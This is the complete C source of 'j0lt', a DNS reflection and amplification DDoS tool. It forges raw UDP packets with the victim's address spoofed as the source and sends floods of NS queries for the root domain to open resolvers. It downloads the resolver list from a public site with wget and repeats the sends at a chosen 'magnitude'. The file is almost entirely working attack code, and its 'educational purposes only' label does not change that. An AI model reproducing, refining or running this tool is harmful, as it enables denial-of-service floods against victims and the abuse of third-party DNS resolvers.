/* PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE 2021
 *      _________  .__   __
 *     |__\   _  \ |  |_/  |_
 *     |  /  /_\  \|  |\   __\
 *     |  \  \_/   \  |_|  |        the-scientist@rootstorm.com
 * /\__|  |\_____  /____/__|          https://www.rootstorm.com
 * \______|      \/              ddos amplification attack tool
 * ------------------------------------------------------------
 * This is unpublished proprietary source code of the-scientist
 *             ** For educational purposes only **                           
 * ------------------------------------------------------------
 * Usage: sudo ./j0lt -t <target> -p <port> -m <magnitude>
 * (the-scientist㉿rs)-$ gcc j0lt.c -o j0lt
 * (the-scientist㉿rs)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -m 1337
 * ------------------------------------------------------------
 * Options:
 * [-x] will print a hexdump of the packet headers
 * [-d] puts j0lt into debug mode, no packets are sent
 * [-r list] will not fetch a resolv list, if one is provided.
 * ------------------------------------------------------------
 */

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <limits.h>
#include <errno.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <arpa/nameser_compat.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <unistd.h>
#include <spawn.h>
#include <bits/types.h>
#include <wait.h>

typedef struct __attribute__((packed, aligned(1))) {
        uint32_t sourceaddr;
        uint32_t destaddr;

#if __BYTE_ORDER == __BIGENDIAN
        uint32_t zero : 8;
        uint32_t protocol : 8;
        uint32_t udplen : 16;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
        uint32_t udplen : 16;
        uint32_t protocol : 8;
        uint32_t zero : 8;
#endif
} PSEUDOHDR;

#define     err_exit(msg) do {  perror(msg);            \
                                exit(EXIT_FAILURE);     \
                                } while (0)

#define DEFINE_INSERT_FN(typename, datatype)            \
        bool insert_##typename                          \
        (uint8_t** buf, size_t* buflen, datatype data)  \
    {                                                   \
        uint64_t msb_mask, lsb_mask,                    \
            bigendian_data, lsb, msb;                   \
        size_t byte_pos, nbits;                         \
                                                        \
        if (*buflen < 1) {                              \
            return false;                               \
        }                                               \
                                                        \
        nbits = sizeof(data) << 3;                      \
        bigendian_data = 0ULL;                          \
        byte_pos = (nbits / 8) - 1;                     \
        lsb_mask = 0xffULL;                             \
        msb_mask = (lsb_mask << nbits) - 8;             \
                                                        \
        byte_pos = byte_pos << 3;                       \
        for (int i = nbits >> 4; i != 0; i--) {         \
            lsb = (data & lsb_mask);                    \
            msb = (data & msb_mask);                    \
            lsb <<= byte_pos;                           \
            msb >>= byte_pos;                           \
            bigendian_data |= lsb | msb;                \
            msb_mask >>= 8;                             \
            lsb_mask <<= 8;                             \
            byte_pos -= (2 << 3);                       \
        }                                               \
                                                        \
        data = bigendian_data == 0 ?                    \
            data : bigendian_data;                      \
        for (int i = sizeof(data);                      \
             *buflen != -1 && i > 0; i--) {             \
            *(*buf)++ = (data & 0xff);                  \
            data = (data >> 8);                         \
            (*buflen)--;                                \
        }                                               \
                                                        \
        return data == 0;                               \
    }                                                   \

DEFINE_INSERT_FN(byte, uint8_t)
DEFINE_INSERT_FN(word, uint16_t)
DEFINE_INSERT_FN(dword, uint32_t)
DEFINE_INSERT_FN(qword, uint64_t)
#undef DEFINE_INSERT_FN

// IP HEADER VALUES
#define     IP_IHL_MIN_J0LT 5
#define     IP_IHL_MAX_J0LT 15
#define     IP_TTL_J0LT 0x40
#define     IP_ID_J0LT 0xc4f3
// FLAGS
#define     IP_RF_J0LT 0x8000 // reserved fragment flag
#define     IP_DF_J0LT 0x4000 // dont fragment flag
#define     IP_MF_J0LT 0x2000 // more fragments flag
#define     IP_OF_J0LT 0x0000
// END FLAGS
#define     IP_VER_J0LT 4
// END IPHEADER VALUES

// DNS HEADER VALUES
#define     DNS_ID_J0LT 0xb4b3
#define     DNS_QR_J0LT 0 // query (0), response (1).
// OPCODE
#define     DNS_OPCODE_J0LT ns_o_query
// END OPCODE
#define     DNS_AA_J0LT 0 // Authoritative Answer
#define     DNS_TC_J0LT 0 // TrunCation
#define     DNS_RD_J0LT 1 // Recursion Desired
#define     DNS_RA_J0LT 0 // Recursion Available
#define     DNS_Z_J0LT 0 // Reserved
#define     DNS_AD_J0LT 0 // dns sec
#define     DNS_CD_J0LT 0 // dns sec
// RCODE
#define     DNS_RCODE_J0LT ns_r_noerror
// END RCODE
#define     DNS_QDCOUNT_J0LT 0x0001 // num questions
#define     DNS_ANCOUNT_J0LT 0x0000 // num answer RRs
#define     DNS_NSCOUNT_J0LT 0x0000 // num authority RRs
#define     DNS_ARCOUNT_J0LT 0x0000 // num additional RRs
// END HEADER VALUES
#define     PEWPEW_J0LT 100 // value for the tmc effect.
#define     MAX_LINE_SZ_J0LT 0x30

char** environ;
const char* g_args = "xdt:p:m:r:";
const char* g_path = "/tmp/resolv.txt";
char* g_wget[] = {
    "/bin/wget", "-O", "/tmp/resolv.txt",
    "https://public-dns.info/nameservers.txt",
    NULL
};

const char* g_menu = {
        "  PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE \n"
        " =========================================================\n"
        " Usage: sudo ./j0lt -t -p -m [OPTION]...                  \n"
        " -t <target>                      : target IPv4 (spoof)   \n"
        " -p <port>                        : target port           \n"
        " -m <magnitude>                   : magnitude of attack   \n"
        " -x [hexdump]                     : print hexdump         \n"
        " -d [debug]                       : offline debug mode    \n"
        " -r [resolv]<path>                : will not download list\n"
        "                                  : provide absolute path \n"
        " =========================================================\n"
        "           sc1entist: https://www.rootstorm.com           \n"
};

bool
read_file_into_mem(const char* filename, void** data_out, size_t* size_out);
size_t
readline(char* src, char* dest, size_t srclim, size_t destlim);
size_t
forge_j0lt_packet(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport);
bool
insert_dns_header(uint8_t** buf, size_t* buflen);
bool
insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
bool
insert_udp_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport);
bool
insert_ip_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen);
bool
send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
bool
insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
uint16_t
j0lt_checksum(const uint16_t* addr, size_t count);
void
print_hex(void* data, size_t len);

int
main(int argc, char** argv)
{
        FILE* fptr;
        char payload[NS_PACKETSZ], lineptr[MAX_LINE_SZ_J0LT], resolvpath[PATH_MAX];
        const char* pathptr;
        char* resolvptr, * endptr;
        void* resolvlist;
        int status, i, opt, s, pathsz, nread;
        bool debugmode, hexmode, filereadmode;
        size_t szresolvlist, szpayload, szpewpew;
        uint32_t spoofip, resolvip;
        uint16_t spoofport, magnitude;
        pid_t child_pid;
        sigset_t mask;
        posix_spawnattr_t attr;
        posix_spawnattr_t* attrp;
        posix_spawn_file_actions_t file_actions;
        posix_spawn_file_actions_t* file_actionsp;

        printf("%s", g_menu);

        filereadmode = debugmode = hexmode = false;
        magnitude = spoofport = spoofip = 0;
        opt = getopt(argc, argv, g_args);
        do {
                switch (opt) {
                case 't':
                        while (*optarg == ' ')
                                optarg++;
                        spoofip = inet_addr(optarg);
                        if (spoofip == 0)
                                err_exit("* invalid spoof ip");
                        break;
                case 'p':
                        errno = 0;
                        spoofport = (uint16_t)strtol(optarg, &endptr, 0);
                        if (errno != 0 || endptr == optarg || *endptr != '\0')
                                err_exit("* spoof port invalid");
                        break;
                case 'm':
                        errno = 0;
                        magnitude = (uint16_t)strtol(optarg, &endptr, 0);
                        if (errno != 0 || endptr == optarg || *endptr != '\0')
                                err_exit("* magnituted invalid");
                        break;
                case 'r': // Feel free to put a git ticket in to fix this ;)
                        while (*optarg == ' ')
                                optarg++;
                        filereadmode = true;
                        pathsz = strlen(optarg);
                        if (pathsz >= PATH_MAX)
                                err_exit("* path size invalid");
                        memcpy(resolvpath, optarg, pathsz);
                        pathptr = resolvpath;
                        break;
                case 'x':
                        hexmode = true;
                        break;
                case 'd':
                        debugmode = true;
                        break;
                case -1:
                default: /* '?' */
                        err_exit("Usage: ./j0lt -t target -p port -m magnitude [OPTION]...\n");
                }
        } while ((opt = getopt(argc, argv, g_args)) != -1);

        if (magnitude == 0 || spoofport == 0 || spoofip == 0)
                err_exit("Usage: ./j0lt -t target -p port -m magnitude [OPTION]...\n");

        attrp = NULL;
        file_actionsp = NULL;
        if (filereadmode == false) {
                pathptr = g_path;
                s = posix_spawnattr_init(&attr);
                if (s != 0)
                        err_exit("* posix_spawnattr_init");
                s = posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETSIGMASK);
                if (s != 0)
                        err_exit("* posix_spawnattr_setflags");

                sigfillset(&mask);
                s = posix_spawnattr_setsigmask(&attr, &mask);
                if (s != 0)
                        err_exit("* posix_spawnattr_setsigmask");

                attrp = &attr;

                s = posix_spawnp(&child_pid, g_wget[0], file_actionsp, attrp, &g_wget[0], environ);
                if (s != 0)
                        err_exit("* posix_spawn");

                if (attrp != NULL) {
                        s = posix_spawnattr_destroy(attrp);
                        if (s != 0)
                                err_exit("* posix_spawnattr_destroy");
                }

                if (file_actionsp != NULL) {
                        s = posix_spawn_file_actions_destroy(file_actionsp);
                        if (s != 0)
                                err_exit("* posix_spawn_file_actions_destroy");
                }
                do {
                        s = waitpid(child_pid, &status, WUNTRACED | WCONTINUED);
                        if (s == -1)
                                err_exit("* waitpid");
                } while (!WIFEXITED(status) && !WIFSIGNALED(status));
        }
        printf("+ resolv list saved to %s\n", pathptr);

        if (read_file_into_mem(pathptr, &resolvlist, &szresolvlist) == false)
                err_exit("* file read error");
        if (filereadmode == false) {
                remove(pathptr);
                printf("- resolv list removed from %s\n", pathptr);
        }

        while (magnitude >= 1) {
                nread = 0;
                resolvptr = (char*)resolvlist;
                printf("+ current attack magnitude %d \n", magnitude);
                while (nread = readline(lineptr, resolvptr, MAX_LINE_SZ_J0LT, szresolvlist) != 0) {
                        resolvptr += nread;
                        szresolvlist -= nread;
                        for (i = 0; isdigit(lineptr[i]); i++)
                                ;
                        if (lineptr[i] != '.') // check ip4
                                continue;
                        resolvip = inet_addr(lineptr);
                        if (resolvip == 0)
                                continue;
                        szpayload = forge_j0lt_packet(payload, htonl(resolvip), htonl(spoofip), spoofport);
                        if (debugmode == 0) {
                                szpewpew = PEWPEW_J0LT;
                                while (szpewpew-- > 0)
                                        send_payload((uint8_t*)payload, resolvip, htons(NS_DEFAULTPORT), szpayload);
                        }
                        if (hexmode == 1)
                                print_hex(payload, szpayload);
                }
                magnitude--;
        }

        free(resolvlist);
        return 0;
}


bool
read_file_into_mem(const char* filename, void** data_out, size_t* size_out)
{
        long filesize;
        void* mem;
        FILE* file;

        file = fopen(filename, "rb");
        if (file == NULL)
                return false;

        fseek(file, 0, SEEK_END);
        filesize = ftell(file);
        rewind(file);

        mem = malloc(filesize);
        if (mem == NULL) {
                fclose(file);
                return false;
        }

        if (fread(mem, filesize, 1, file) != 1) {
                printf("* Failed to read data\n");
                fclose(file);
                free(mem);
                return false;
        }

        fclose(file);

        *data_out = mem;
        *size_out = filesize;
        return true;
}


size_t
readline(char* src, char* dest, size_t srclim, size_t destlim)
{
        size_t i;

        for (i = 0; i < srclim - 1 && i < destlim && *dest != '\n'; ++i)
                src[i] = *dest++;
        src[i] = '\0';
        return i;
}


size_t
forge_j0lt_packet(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport)
{
        const char* url = ".";
        uint8_t pktbuf[NS_PACKETSZ], datagram[NS_PACKETSZ];
        uint8_t* curpos;
        size_t buflen, nwritten, szdatagram, udpsz;
        bool status;

        PSEUDOHDR pseudoheader;

        buflen = NS_PACKETSZ;
        memset(pktbuf, 0, NS_PACKETSZ);

        curpos = pktbuf;
        status = true;
        status &= insert_dns_header(&curpos, &buflen);
        status &= insert_dns_question((void**)&curpos, &buflen, url, ns_t_ns, ns_c_in);

        if (status == false)
                return 0;

        memset(datagram, 0, NS_PACKETSZ);
        curpos = datagram;
        udpsz = NS_PACKETSZ - buflen + sizeof(struct udphdr);
        status &= insert_ip_header(&curpos, &buflen, &pseudoheader, resolvip, spoofip, udpsz);
        status &= insert_udp_header(&curpos, &buflen, &pseudoheader, pktbuf, udpsz, spoofport);
        if (status == false)
                return 0;

        szdatagram = buflen;
        insert_data((void**)&curpos, &szdatagram, pktbuf, udpsz);
        nwritten = NS_PACKETSZ - buflen;

        memcpy(payload, datagram, nwritten);

        return nwritten;
}


bool
insert_dns_header(uint8_t** buf, size_t* buflen)
{
        bool status;
        uint8_t third_byte, fourth_byte;

        third_byte = (
                DNS_RD_J0LT |
                DNS_TC_J0LT << 1 |
                DNS_AA_J0LT << 2 |
                DNS_OPCODE_J0LT << 3 |
                DNS_QR_J0LT << 7
                );

        fourth_byte = (
                DNS_RCODE_J0LT |
                DNS_CD_J0LT << 4 |
                DNS_AD_J0LT << 5 |
                DNS_Z_J0LT << 6 |
                DNS_RA_J0LT << 7
                );

        status = true;
        status &= insert_word(buf, buflen, DNS_ID_J0LT);

        status &= insert_byte(buf, buflen, third_byte);
        status &= insert_byte(buf, buflen, fourth_byte);

        status &= insert_word(buf, buflen, DNS_QDCOUNT_J0LT);
        status &= insert_word(buf, buflen, DNS_ANCOUNT_J0LT);
        status &= insert_word(buf, buflen, DNS_NSCOUNT_J0LT);
        status &= insert_word(buf, buflen, DNS_ARCOUNT_J0LT);

        return status;
}


bool
insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
{
        const char* token;
        char* saveptr, qname[NS_PACKETSZ];
        size_t srclen, domainlen, dif;
        bool status;

        dif = *buflen;
        domainlen = strlen(domain) + 1;
        if (domainlen > NS_PACKETSZ - 1)
                return false;

        memcpy(qname, domain, domainlen);
        if (qname[0] != '.') {
                token = strtok_r(qname, ".", &saveptr);
                if (token == NULL)
                        return false;
                while (token != NULL) {
                        srclen = strlen(token);
                        insert_byte((uint8_t**)buf, buflen, srclen);
                        insert_data(buf, buflen, token, srclen);
                        token = strtok_r(NULL, ".", &saveptr);
                }
        }

        status = true;
        status &= insert_byte((uint8_t**)buf, buflen, 0x00);
        status &= insert_word((uint8_t**)buf, buflen, query_type);
        status &= insert_word((uint8_t**)buf, buflen, query_class);

        dif -= *buflen;
        if (dif % 2 != 0) // pad
                status &= insert_byte((uint8_t**)buf, buflen, 0x00);

        return status;
}


bool
insert_udp_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport)
{
        bool status;
        size_t totalsz = sizeof(PSEUDOHDR) + ulen;
        size_t datasz = (ulen - sizeof(struct udphdr));
        size_t udpsofar;
        uint16_t checksum;
        uint8_t pseudo[totalsz];
        uint8_t* pseudoptr = pseudo;

        status = true;
        status &= insert_word(buf, buflen, sport);
        status &= insert_word(buf, buflen, NS_DEFAULTPORT);
        status &= insert_word(buf, buflen, (uint16_t)ulen);
        udpsofar = sizeof(struct udphdr) - 2;

        memset(pseudo, 0, totalsz);
        insert_dword(&pseudoptr, &totalsz, phdr->sourceaddr);
        insert_dword(&pseudoptr, &totalsz, phdr->destaddr);
        insert_byte(&pseudoptr, &totalsz, phdr->zero);
        insert_byte(&pseudoptr, &totalsz, phdr->protocol);
        insert_word(&pseudoptr, &totalsz, sizeof(struct udphdr));

        *buf -= udpsofar;
        insert_data((void**)&pseudoptr, (void*)&totalsz, *buf, udpsofar + 2);
        *buf += udpsofar;
        insert_data((void**)&pseudoptr, (void*)&totalsz, data, datasz);
        checksum = j0lt_checksum((uint16_t*)pseudo, sizeof(PSEUDOHDR) + ulen);
        checksum -= datasz; // wtf...
        status &= insert_word(buf, buflen, checksum);

        return status;
}


bool
insert_ip_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen)
{
        bool status;
        uint8_t* bufptr = *buf;
        uint8_t first_byte;
        uint16_t checksum;

        status = true;
        first_byte = IP_VER_J0LT << 4 | IP_IHL_MIN_J0LT;
        status &= insert_byte(buf, buflen, first_byte);
        status &= insert_byte(buf, buflen, 0x00); // TOS
        status &= insert_word(buf, buflen, (IP_IHL_MIN_J0LT << 2) + ulen); // total len
        status &= insert_word(buf, buflen, IP_ID_J0LT);
        status &= insert_word(buf, buflen, IP_OF_J0LT);
        status &= insert_byte(buf, buflen, IP_TTL_J0LT);
        status &= insert_byte(buf, buflen, getprotobyname("udp")->p_proto);
        status &= insert_word(buf, buflen, 0x0000);
        status &= insert_dword(buf, buflen, saddr);
        status &= insert_dword(buf, buflen, daddr);

        checksum = j0lt_checksum((const uint16_t*)bufptr, (size_t)(IP_IHL_MIN_J0LT << 2));
        *buf -= 0xa;
        *(*buf)++ = (checksum & 0xff00) >> 8;
        **buf = checksum & 0xff;
        *buf += 9;

        memset(pheader, 0, sizeof(PSEUDOHDR));
        pheader->protocol = getprotobyname("udp")->p_proto;
        pheader->destaddr = daddr;
        pheader->sourceaddr = saddr;

        return status;
}


bool
send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten)
{
        int raw_sockfd;
        ssize_t nread;
        struct sockaddr_in addr;

        raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (raw_sockfd == -1)
                err_exit("* fatal socket error run using sudo");

        addr.sin_family = AF_INET;
        addr.sin_port = uh_dport;
        addr.sin_addr.s_addr = daddr;

        nread = sendto(
                raw_sockfd,
                datagram,
                nwritten,
                0,
                (const struct sockaddr*)&addr,
                sizeof(addr)
        );

        close(raw_sockfd);
        return !(nread == -1 || nread != nwritten);
}


bool
insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
{
        if (*dst_buflen < src_len)
                return false;

        memcpy(*dst, src, src_len);
        *dst += src_len;
        *dst_buflen -= src_len;

        return true;
}


uint16_t
j0lt_checksum(const uint16_t* addr, size_t count)
{
        register uint64_t sum = 0;

        while (count > 1) {
                sum += *(uint16_t*)addr++;
                count -= 2;
        }

        if (count > 0)
                sum += *(uint8_t*)addr;

        while (sum >> 16)
                sum = (sum & 0xffff) + (sum >> 16);

        return ~((uint16_t)((sum << 8) | (sum >> 8)));
}


void
print_hex(void* data, size_t len)
{
        const uint8_t* d = (const uint8_t*)data;
        size_t i, j;
        for (j = 0, i = 0; i < len; i++) {
                if (i % 16 == 0) {
                        printf("\n0x%.4zx: ", j);
                        j += 16;
                }
                if (i % 2 == 0)
                        putchar(' ');
                printf("%.2x", d[i]);
        }
        putchar('\n');
}
